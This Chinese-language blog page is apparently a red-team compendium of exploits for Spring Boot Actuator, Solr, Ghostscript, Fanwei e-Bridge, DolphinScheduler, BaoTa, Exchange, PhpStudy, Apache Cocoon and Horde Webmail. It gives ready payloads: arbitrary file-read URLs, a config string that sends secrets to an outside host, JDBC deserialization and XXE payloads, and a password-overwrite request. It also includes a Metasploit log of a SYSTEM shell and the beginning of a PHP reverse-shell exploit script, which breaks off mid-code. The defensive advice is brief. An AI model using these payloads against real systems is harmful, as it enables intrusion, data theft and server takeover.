相关漏洞超级好用，很多厂商一开始都不懂, 直接对外开放Spring Boot Actuators, 造成了有一段时间每个用了Spring Boot的厂商都出了问题，尤其是现在很多厂商使用微服务框架, 通过网关进行路由分发, 一些子目录通常对应一个Spring Boot启动<a href="http://123.123.123.123/admin/env">的服务。然后子目录比如 http://123.123.123.123/admin/env </a>, <a href="http://123.123.123.123/manager/env%E4%B9%9F%E9%83%BD%E6%98%AF%E5%8F%AF%E4%BB%A5%E5%87%BA%E7%8E%B0%E7%9A%84/env">http://123.123.123.123/manager/env也都是可以出现的/env </a>可以偷session, RCE/heapdump 可以直接dump jvm中的对象, 使用 jhat 可以读取里面的对象可以遍历如下的endpoint, 1.x 2.x的目录不一样, 所以都覆盖了一下</p><p><code>/trace</code></p><p><code>/health</code></p><p><code>/loggers</code></p><p><code>/metrics</code></p><p><code>/autoconfig</code></p><p><code>/heapdump</code></p><p><code>/threaddump</code></p><p><code>/env</code></p><p><code>/info</code></p><p><code>/dump</code></p><p><code>/configprops</code></p><p><code>/mappings</code></p><p><code>/auditevents</code></p><p><code>/beans</code></p><p><code>/jolokia</code></p><p><code>/cloudfoundryapplication</code></p><p><code>/hystrix.stream</code></p><p><code>/actuator</code></p><p><code>/actuator/auditevents</code></p><p><code>/actuator/beans</code></p><p><code>/actuator/health</code></p><p><code>/actuator/conditions</code></p><p><code>/actuator/configprops</code></p><p><code>/actuator/env</code></p><p><code>/actuator/info</code></p><p><code>/actuator/loggers</code></p><p><code>/actuator/heapdump</code></p><p><code>/actuator/threaddump</code></p><p><code>/actuator/metrics</code></p><p><code>/actuator/scheduledtasks</code></p><p><code>/actuator/httptrace</code></p><p><code>/actuator/mappings</code></p><p><code>/actuator/jolokia</code></p><p><code>/actuator/hystrix.stream</code></p><p><code>/monitor</code></p><p><code>/monitor/auditevents</code></p><p><code>/monitor/beans</code></p><p><code>/monitor/health</code></p><p><code>/monitor/conditions</code></p><p><code>/monitor/configprops</code></p><p><code>/monitor/env</code></p><p><code>/monitor/info</code></p><p><code>/monitor/loggers</code></p><p><code>/monitor/heapdump</code></p><p><code>/monitor/threaddump</code></p><p><code>/monitor/metrics</code></p><p><code>/monitor/scheduledtasks</code></p><p><code>/monitor/httptrace</code></p><p><code>/monitor/mappings</code></p><p><code>/monitor/jolokia</code></p><p><code>/monitor/hystrix.stream</code></p><p>这里通过 /env + /refresh 进行rce应该还有其他利用手法, 当spring boot reload的时候会进行一些默认操作，里面就有操作空间, 很像fastjson反序列化。</p><p>2.就算实在不能RCE, 这里也有个技巧可以偷取 Spring 配置文件中的加密字段, 偷一下生产环境的密码/key也ok </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eureka.client.serviceUrl.defaultZone&#x3D;http:&#x2F;&#x2F;$&#123;somedb.pasword&#125;@127.0.0.1:5000 spring.cloud.bootstrap.location&#x3D;http:&#x2F;&#x2F;$&#123;somedb.password&#125;@artsploit.com&#x2F;yaml-payload.yml</span><br></pre></td></tr></table></figure><p>3.尤其是使用spring eureka做集群的时候, 通常拿到一台服务器, 就可以传递恶意注册到其他server, 从而感染整个微服务集群eureka 通常是 server 也是 client, 无论对方请求什么都直接返回恶意序列化xml就可以了</p><p>8.防护方法<br>1.及时更新补丁<br>2.开启Spring Boot Actuators权限校验<br>3.前置WAF进行防护</p><h2 id="Solr-系列漏洞"><a href="#Solr-系列漏洞" class="headerlink" title="Solr 系列漏洞"></a>Solr 系列漏洞</h2><p>1.漏 洞 简 介<br>Solr 是企业常见的全文搜索服务, 这两年也爆出很多安全漏洞,</p><p>2.影响组件Solr</p><p>3.漏洞指纹Solr</p><p>4.Fofa Dork </p><p>app=”Solr”</p><p>5.漏洞分析</p><p>Apache Solr最新RCE漏洞分析 – FreeBuf互联网安全新媒体平台<a href="http://www.freebuf.com/vuls/218730.html">https://www.freebuf.com/vuls/218730.html</a></p><p>Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193) 分析<a href="https://paper.seebug.org/1009/">https://paper.seebug.org/1009/</a></p><p>6.漏洞利用</p><p>veracode-research/solr-injection: Apache Solr Injection Research <a href="https://github.com/veracode-research/solr-injection">https://github.com/veracode-research/solr-injection</a></p><p>jas502n/CVE-2019-12409: Apache Solr RCE (ENABLE_REMOTE_JMX_OPTS=”true”)</p><p><a href="https://github.com/jas502n/CVE-2019-12409">https://github.com/jas502n/CVE-2019-12409</a></p><p>mogwailabs/mjet: MOGWAI LABS JMX exploitation toolkit <a href="https://github.com/mogwailabs/mjet">https://github.com/mogwailabs/mjet</a></p><p>7.利用技巧</p><p>1.看到锤就完事了, 漏洞太多了, 一片一片的</p><p>2.遇到mjet连接超时,这是目标服务起返回了错误的stub(内网地址, 常见于docker), 可以使用socat进行流量转发, 后记里面有具体操作</p><p>8.防护方法<br>1.升级到最新版<br>2.不要对外开放敏感端口</p><h2 id="Ghostscript-上传图片代码执行"><a href="#Ghostscript-上传图片代码执行" class="headerlink" title="Ghostscript 上传图片代码执行"></a>Ghostscript 上传图片代码执行</h2><p>1.漏洞简介</p><p>Ghostscript 是图像处理中十分常用的库, 集成在imagemagick等多个开源组件中, 其 .ps文件存在沙箱绕过导致代码执行的问题影响广泛, 由于上传图片就有可能代码执行, 很多大厂中招</p><p>2.影响组件</p><p>imagemagick, libmagick, graphicsmagick, gimp, python-matplotlib, texlive-core, texmacs, latex2html, latex2rtf 等图像处理应用</p><p>3.漏洞指纹</p><p>.ps/.jpg/.png</p><p>4.Fofa Dork</p><p>5.漏洞分析<br>ghostscript命令执行漏洞预警</p><p><a href="http://www.anquanke.com/post/id/157513">https://www.anquanke.com/post/id/157513</a></p><p>6.漏洞利用</p><p>Exploit Database Search</p><p><a href="http://www.exploit-db.com/search?q=Ghostscript">https://www.exploit-db.com/search?q=Ghostscript</a> vulhub/ghostscript/CVE-2019-6116 at master · vulhub/vulhub</p><p><a href="https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116">https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116</a></p><p>7.利用技巧</p><p>1.如果发现网站可以上传图片, 且图片没有经过裁剪, 最后返回缩略图, 这里就可能存在Ghostscript 上传图片代码执行dnslog 可以用 ping</p><p><code>uname.admin.ceye.io</code> 或 <code>ping whoami.admin.ceye.io</code>保存成图片, 以后用起来方便, 有个版本的 <code>centos</code> 和 <code>ubuntu poc</code>还不一样, 可以这样构造ping <code>whoami.centos.admin.ceye.io</code> / <code>ping whoami.ubuntu.admin.ceye.io</code>分别命名为 <code>centos_ps.jpg</code>/<code>ubuntu_ps.jpg</code>, 这样测试的时候直接传2个文件, 通过DNSLOG可以区分是哪个poc执行的</p><p>8.防护方法<br>1.升级到最新版</p><h2 id="泛微云桥复现"><a href="#泛微云桥复现" class="headerlink" title="泛微云桥复现"></a>泛微云桥复现</h2><p>1.其 实 没 什 么 复 现 的 。 。 。 未 授 权 读 取 。 直 接 调 用 exp 就 OK<br><a href="http://www.aaa.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt">http://www.aaa.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt</a> <a href="http://www.aaa.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///c://windows/win.ini&amp;fileExt=txt">http://www.aaa.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///c://windows/win.ini&amp;fileExt=txt</a> </p><p>2.任意读取linux的passwd值</p><p>可在响应包中JSON中包含ID的32位值再次请求可获得/etc/passwd值<br><a href="http://www.aaa.com/FileNoLogin/32%E4%BD%8DMD5%E5%80%BC">http://www.aaa.com/FileNoLogin/32位MD5值</a><br><a href="http://www.aaa.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=tx">http://www.aaa.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=tx</a><br><img src="/image/HW/32.jpg" alt="1"><br><img src="/image/HW/33.jpg" alt="1"><br><img src="/image/HW/34.jpg" alt="1"></p><p>3.任意读取winodws下的win.ini值<br>未授权任意文件读取,/wxjsapi/saveYZJFile接口获取filepath,返回数据包内出现了程序的绝对路径,攻击者可以通过返回内容识别程序运行路径从而下载数据库配置文件危害可见。<br>1.downloadUrl参数修改成需要获取文件的绝对路径,记录返回包中的id值。<br><a href="http://www.xxx.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///c://windows/win.ini&amp;fileExt=txt">http://www.xxx.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///c://windows/win.ini&amp;fileExt=txt</a><br><img src="/image/HW/35.jpg" alt="1"><br>2.通过查看文件接口访问 /file/fileNoLogin/id<br><img src="/image/HW/36.jpg" alt="1"></p><p>3.其他利用技巧（读取任意目录文件）<br>简单说说昨天泛微云桥的报告,输入文件路径-&gt;读取文件内容,我们读了一下代码后发现这还能读取文件目录。参数不填写绝对路径写进文本内容就是当前的目录,产生了一个新的漏洞 “目录遍历”<br>/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///D:/&amp;fileExt=txt<br><img src="/image/HW/37.jpg" alt="1"><br>目录遍历+文件读取,我们能做的事情就很多了,比如读取管理员在桌面留下的密码文件、数据库配置文件、nginx代理配置、访问日志、D盘迅雷下载：<br>d://ebridge//tomcat//webapps//ROOT//WEB-INF//classes//init.properties<br>d:/OA/tomcat8/webapps/OAMS/WEB-INF/classes/dbconfig.properties 泛微OA数据库<br><img src="/image/HW/38.jpg" alt="1"><br>4.修复建议:<br>关闭程序路由 /file/fileNoLogin</p><h2 id="网瑞达webVPN-RCE漏洞"><a href="#网瑞达webVPN-RCE漏洞" class="headerlink" title="网瑞达webVPN RCE漏洞"></a>网瑞达webVPN RCE漏洞</h2><p>1.漏洞描述</p><p>WebVPN是提供基于web的内网应用访问控制，允许授权用户访问只对内网开放的web应用，实现类似VPN（虚拟专用网）的功能。近日网瑞达的webVPN被曝出存在RCE的漏洞。</p><p>2.修复建议</p><p>建议去官网更新最新版本</p><h2 id="Apache-DolphinScheduler高危漏洞（CVE-2020-11974、CVE-2020-13922）"><a href="#Apache-DolphinScheduler高危漏洞（CVE-2020-11974、CVE-2020-13922）" class="headerlink" title="Apache DolphinScheduler高危漏洞（CVE-2020-11974、CVE-2020-13922）"></a>Apache DolphinScheduler高危漏洞（CVE-2020-11974、CVE-2020-13922）</h2><p>1.漏洞描述</p><p>Apache软件基金会发布安全公告，修复了Apache DolphinScheduler权限覆盖漏洞（CVE-2020-13922）与Apache DolphinScheduler 远程执行代码漏洞（CVE-2020-11974）。</p><p>CVE-2020-11974与mysql connectorj远程执行代码漏洞有关，在选择mysql作为数据库时，攻击者可通过jdbc connect参数输入</p><p>{“detectCustomCollations”:true，“ autoDeserialize”:true} 在DolphinScheduler 服务器上远程执行代码。CVE-2020-13922导致普通用户可通过api interface在DolphinScheduler 系统中覆盖其他用户的密码：api interface</p><p>/dolphinscheduler/users/update，请相关用户及时升级进行防护。</p><p>2.影响范围</p><p>Apache DolphinScheduler权限覆盖漏洞（CVE-2020-13922） </p><p>3.受影响版本</p><p>Apache DolphinScheduler = 1.2.0、1.2.1、1.3.1 </p><p>4.不受影响版本</p><p>Apache DolphinScheduler &gt;= 1.3.2</p><p>Apache DolphinScheduler远程执行代码漏洞（CVE-2020-11974） </p><p>5.利用POC:</p><pre><code>POST /dolphinscheduler/users/updateid=1&amp;userName=admin&amp;userPassword=Password1!&amp;tenantId=1&amp;email=sdluser%40sdluser.sdluser&amp;phone=</code></pre><p><img src="/image/HW/39.jpg" alt="1"></p><p>利用漏洞:需要登录权限,提供一组默认密码。</p><p>该漏洞存在于数据源中心未限制添加的jdbc连接参数,从而实现JDBC客户端反序列化。</p><p>1、登录到面板 -&gt; 数据源中心<br><img src="/image/HW/40.jpg" alt="1"><br>2、jdbc连接参数就是主角,这里没有限制任意类型的连接串参数。<br><img src="/image/HW/41.jpg" alt="1"><br>3、将以下数据添加到jdbc连接参数中,就可以直接触发。<br><img src="/image/HW/42.jpg" alt="1"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;dolphinscheduler&#x2F;datasources&#x2F;connect HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">type&#x3D;MYSQL&amp;name&#x3D;test&amp;note&#x3D;&amp;host&#x3D;127.0.0.1&amp;port&#x3D;3306&amp;database&#x3D;test&amp; principal&#x3D;&amp;userName&#x3D;root&amp;password&#x3D;root&amp;connectType&#x3D;&amp;</span><br><span class="line"></span><br><span class="line">other&#x3D;&#123;&quot;detectCustomCollations&quot;:true,&quot;autoDeserialize&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>关于MySQL JDBC客户端反序列化漏洞的相关参考： <a href="http://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></p><p>5.修复建议官方升级</p><p>目前官方已在最新版本中修复了此次的漏洞，请受影响的用户尽快升级版本至1.3.2进行防护，官方下载链接： <a href="https://dolphinscheduler.apache.org/zhcn/docs/release/download.html">https://dolphinscheduler.apache.org/zhcn/docs/release/download.html</a></p><h2 id="宝塔面板phpMyadmin未授权访问"><a href="#宝塔面板phpMyadmin未授权访问" class="headerlink" title="宝塔面板phpMyadmin未授权访问"></a>宝塔面板phpMyadmin未授权访问</h2><p>来源: <a href="https://mp.weixin.qq.com/s/3ZjwFo5gWlJACSkeYWQLXA">https://mp.weixin.qq.com/s/3ZjwFo5gWlJACSkeYWQLXA</a></p><p>前段时间在朋友圈和微信群里火热不行的宝塔数据库面板未授权无需登录,以下是存在安全问题的版本。</p><p>- Linux正式版7.4.2</p><p>- Linux测试版7.5.13</p><p>- Windows正式版6.8    </p><p>1、宝塔默认phpMyadmin端口就是888 而这个漏洞排查方式极其简单 172.10.0.121:888/pma</p><p>2、如果宝塔是存在安全问题的版本,那就会直接出现phpMyadmin面板页面。<br><img src="/image/HW/43.jpg" alt="1"></p><h2 id="CVE-2020-16875-Exchange-Server-远程代码执行漏洞"><a href="#CVE-2020-16875-Exchange-Server-远程代码执行漏洞" class="headerlink" title="CVE-2020-16875: Exchange Server 远程代码执行漏洞"></a>CVE-2020-16875: Exchange Server 远程代码执行漏洞</h2><p>更新公告:<a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16875">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16875</a> 微软公告说的很明显,只需要一个Exchange用户账号。就能在Exchange服务器上执行任意命令。<a href="https://srcincite.io/pocs/cve-2020-16875.py.txt">https://srcincite.io/pocs/cve-2020-16875.py.txt</a></p><p><a href="https://srcincite.io/pocs/cve-2020-16875.ps1.txt">https://srcincite.io/pocs/cve-2020-16875.ps1.txt</a> researcher@incite:~$ ./poc.py</p><p>(+) usage: ./poc.py <target> <a href="user:pass">user:pass</a> <cmd></p><p>(+) eg: ./poc.py 192.168.75.142 <a href="mailto:&#104;&#x61;&#114;&#x72;&#x79;&#x6d;&#x40;&#101;&#x78;&#x63;&#x68;&#x61;&#x6e;&#103;&#x65;&#x64;&#x65;&#x6d;&#x6f;&#46;&#99;&#x6f;&#109;">&#104;&#x61;&#114;&#x72;&#x79;&#x6d;&#x40;&#101;&#x78;&#x63;&#x68;&#x61;&#x6e;&#103;&#x65;&#x64;&#x65;&#x6d;&#x6f;&#46;&#99;&#x6f;&#109;</a>:user123### mspaint</p><p>researcher@incite:~$ ./poc.py 192.168.75.142 <a href="mailto:&#104;&#97;&#114;&#x72;&#x79;&#109;&#64;&#101;&#x78;&#99;&#x68;&#x61;&#x6e;&#103;&#x65;&#100;&#101;&#x6d;&#111;&#46;&#99;&#x6f;&#x6d;">&#104;&#97;&#114;&#x72;&#x79;&#109;&#64;&#101;&#x78;&#99;&#x68;&#x61;&#x6e;&#103;&#x65;&#100;&#101;&#x6d;&#111;&#46;&#99;&#x6f;&#x6d;</a>:user123### mspaint<br><a href="mailto:harrym@exchangedemo.com">(+) logged in as harrym@exchangedemo.com</a></p><p>(+) found the viewstate: /wEPDwUILTg5MDAzMDFkZFAeyPS7/eBJ4lPNRNPBjm8QiWLWnirQ1vsGlSyjVxa5</p><p>(+) triggered rce as SYSTEM!</p><p>Microsoft Exchange远程代码执行(CVE-2020-16875):</p><p>Microsoft Exchange服务器中存在一个远程执行代码漏洞。成功利用此漏洞的攻击者可以在系统用户的上下文中运行任意代码。利用此漏洞需要拥该漏洞影响版本:</p><p>microsoft:exchange_server_2016: cu16/cu17<br>microsoft:exchange_server_2019: cu5/cu6</p><p>MSF利用（<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/exchange_ecp_dlp_policy.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/exchange_ecp_dlp_policy.rb</a> </p><p>msf6 exploit(windows/http/exchange_ecp_dlp_policy) &gt; run</p><p>[*] Started HTTPS reverse handler on <a href="https://192.168.123.1:8443/">https://192.168.123.1:8443</a> </p><p>[*] Executing automatic check (disable AutoCheck to override)</p><p>[!] The service is running, but could not be validated. OWA is running at <a href="https://192.168.123.192/owa/">https://192.168.123.192/owa/</a></p><p>[*] Logging in to OWA with creds Administrator:Passw0rd! </p><p>[+] Successfully logged in to OWA</p><p>[*] Retrieving ViewState from DLP policy creation page </p><p>[+] Successfully retrieved ViewState</p><p>[*] Creating custom DLP policy from malicious template</p><p>[*] DLP policy name: Abbotstone Agricultural Property Unit Trust Data </p><p>[*] Powershell command length: 2372</p><p>[*] <a href="https://192.168.123.1:8443/">https://192.168.123.1:8443</a> handling request from 192.168.123.192; (UUID: rwlz4ahe) Staging x64 payload (201308 bytes) … </p><p>[*] Meterpreter session 1 opened (192.168.123.1:8443 -&gt; 192.168.123.192:6951) at 2020-09-16 02:39:17 -0500</p><p>meterpreter &gt; getuid</p><p>Server username: NT AUTHORITY\SYSTEM meterpreter &gt; sysinfo</p><p>Computer     : WIN-365Q2VJJS17</p><p>OS       : Windows 2016+ (10.0 Build 14393). Architecture : x64</p><p>System Language : en_US Domain  : GIBSON Logged On Users : 8 Meterpreter       : x64/windows<br>meterpreter &gt;</p><h2 id="PhpStudy-nginx解析漏洞"><a href="#PhpStudy-nginx解析漏洞" class="headerlink" title="PhpStudy nginx解析漏洞"></a>PhpStudy nginx解析漏洞</h2><p>小皮面板 &lt;= 8.1.0.7，其实这个漏洞确实不是phpstudy的问题,而是2017年就出现的nginx解析漏洞。</p><p>1、利用条件就只需要把php恶意文件上传(oss不算!)到服务器。<br><?php phpinfo();?><br>2、通过 /x.txt/x.php 方式访问上传的图片地址,啪嚓! 就解析了php代码。<br><img src="/image/HW/44.jpg" alt="1"></p><h2 id="Apache-Cocoon-XML注入-CVE-2020-11991"><a href="#Apache-Cocoon-XML注入-CVE-2020-11991" class="headerlink" title="Apache Cocoon XML注入 [CVE-2020-11991]"></a>Apache Cocoon XML注入 [CVE-2020-11991]</h2><p><a href="http://mail-archives.apache.org/mod_mbox/cocoon-users/202009.mbox/author">来源:http://mail-archives.apache.org/mod_mbox/cocoon-users/202009.mbox/author</a></p><p>程序使用了StreamGenerator这个方法时,解析从外部请求的xml数据包未做相关的限制,恶意用户就可以构造任意的xml表达式,使服务器解析达到XML注入的安全问题。</p><p>1、漏洞利用条件有限必须是apacheCocoon且使用了StreamGenerator,也就是说只要传输的数据被解析就可以实现了。</p><p>2、利用POC:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?xml version&#x3D;&quot;1.0&quot; ?--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt;</span><br><span class="line"></span><br><span class="line">&lt;userInfo&gt;</span><br><span class="line"></span><br><span class="line">&lt;firstName&gt;John&lt;&#x2F;firstName&gt;</span><br><span class="line"></span><br><span class="line">&lt;lastName&gt;&amp;ent;&lt;&#x2F;lastName&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;userInfo&gt;</span><br></pre></td></tr></table></figure><p><img src="/image/HW/45.jpg" alt="1"></p><h2 id="Horde-Groupware-Webmail-Edition-远程命令执行"><a href="#Horde-Groupware-Webmail-Edition-远程命令执行" class="headerlink" title="Horde Groupware Webmail Edition 远程命令执行"></a>Horde Groupware Webmail Edition 远程命令执行</h2><p>来源: <a href="https://srcincite.io/pocs/zdi-20-1051.py.txt">https://srcincite.io/pocs/zdi-20-1051.py.txt</a> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Horde Groupware Webmail Edition Sort sortpref Deserialization of Untrusted Data Remote Code Execution Vulnerability</span><br><span class="line"></span><br><span class="line">Identifiers: ZDI-CAN-10436 &#x2F; ZDI-20-1051</span><br><span class="line">Found by ..: mr_me</span><br><span class="line">Tested on .: Horde Groupware Webmail 5.2.22 (pear installation) on Debian 9 Stretch w&#x2F; Apache&#x2F;2.4.25 &amp; PHP 7.0.33</span><br><span class="line"></span><br><span class="line">Summary:</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">It&#39;s possible to reach a deserialization of untrusted data vulnerability within the constructor of the IMP_Prefs_Sort class. A low privileged authenticated attacker can leverage this to achieve remote code execution.</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">saturn:~ mr_me$ .&#x2F;poc.py </span><br><span class="line">(+) usage .&#x2F;poc.py &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;</span><br><span class="line">(+) eg: .&#x2F;poc.py 172.16.175.148 &#x2F;horde&#x2F; hordeuser:pass123 172.16.175.1:1337</span><br><span class="line"></span><br><span class="line">saturn:~ mr_me$ .&#x2F;poc.py 172.16.175.148 &#x2F;horde&#x2F; hordeuser:pass123 172.16.175.1:1337</span><br><span class="line">(+) targeting http:&#x2F;&#x2F;172.16.175.145&#x2F;horde&#x2F;</span><br><span class="line">(+) obtained session iefankvohbl8og0mtaadm3efb6</span><br><span class="line">(+) inserted our php object</span><br><span class="line">(+) triggering deserialization...</span><br><span class="line">(+) starting handler on port 1337</span><br><span class="line">(+) connection from 172.16.175.145</span><br><span class="line">(+) pop thy shell!</span><br><span class="line">id</span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br><span class="line">pwd</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;horde&#x2F;services</span><br><span class="line">uname -a</span><br><span class="line">Linux target 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 GNU&#x2F;Linux</span><br><span class="line">exit</span><br><span class="line">*** Connection closed by remote host ***</span><br><span class="line">(+) repaired the target!</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import socket</span><br><span class="line">import requests</span><br><span class="line">import telnetlib</span><br><span class="line">import base64</span><br><span class="line">from threading import Thread</span><br><span class="line"></span><br><span class="line">def rs(cbh, cbp):</span><br><span class="line">    return &quot;&quot;&quot;@error_reporting(-1);</span><br><span class="line">@set_time_limit(0); </span><br><span class="line">@ignore_user_abort(1);</span><br><span class="line">$dis&#x3D;@ini_get(&#39;disable_functions&#39;);</span><br><span class="line">if(!empty($dis))&#123;</span><br><span class="line">    $dis&#x3D;preg_replace(&#39;&#x2F;[, ]+&#x2F;&#39;, &#39;,&#39;, $dis);</span><br><span class="line">    $dis&#x3D;explode(&#39;,&#39;, $dis);</span><br><span class="line">    $dis&#x3D;array_map(&#39;trim&#39;, $dis);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $dis&#x3D;array();</span><br><span class="line">&#125;</span><br><span class="line">$ipaddr&#x3D;&#39;%s&#39;;</span><br><span class="line">$port&#x3D;%d;</span><br><span class="line">function PtdSlhY($c)&#123;</span><br><span class="line">    global $dis; </span><br><span class="line">    if (FALSE !&#x3D;&#x3D; strpos(strtolower(PHP_OS), &#39;win&#39; )) &#123;</span><br><span class="line">        $c&#x3D;$c.&quot; 2&gt;&amp;1\\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    ob_start();</span><br><span class="line">    system($c);</span><br><span class="line">    $o&#x3D;ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    if (strlen($o) 